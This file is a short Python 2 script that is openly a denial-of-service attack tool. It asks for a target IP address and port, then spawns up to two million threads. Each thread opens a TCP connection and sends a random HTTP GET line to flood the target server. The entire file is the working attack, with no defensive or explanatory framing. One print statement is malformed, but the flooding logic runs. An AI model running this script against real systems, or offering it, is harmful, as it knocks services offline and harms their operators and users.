import socket
import string
import random
import time
import threading
import sys

global n
n=0

host=str(raw_input("Enter target ip adress:"))
port=int(raw_input("Enter target port:"))
ip=socket.gethostbyname(host)
def attack():
  global n
  msg=str(string.letters+string.digits+string.punctuation)
  data="".join(random.sample(msg,10))
  dos=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  n+=1
  dos.connect((ip,port))
  dos.send("GET /%s HTTP/1.1\r\n"%data)
  print"Dos started at:"%data
print"[#]Attack started on",host,"|",ip,"\n"
nn=0
ran=1000000
for i in xrange(ran):
   nn+=1
   t1=threading.Thread(target=attack)
   t1.daemon=True
   t1.start()
    
   t2=threading.Thread(target=attack)
   t2.daemon=True
   t2.start()
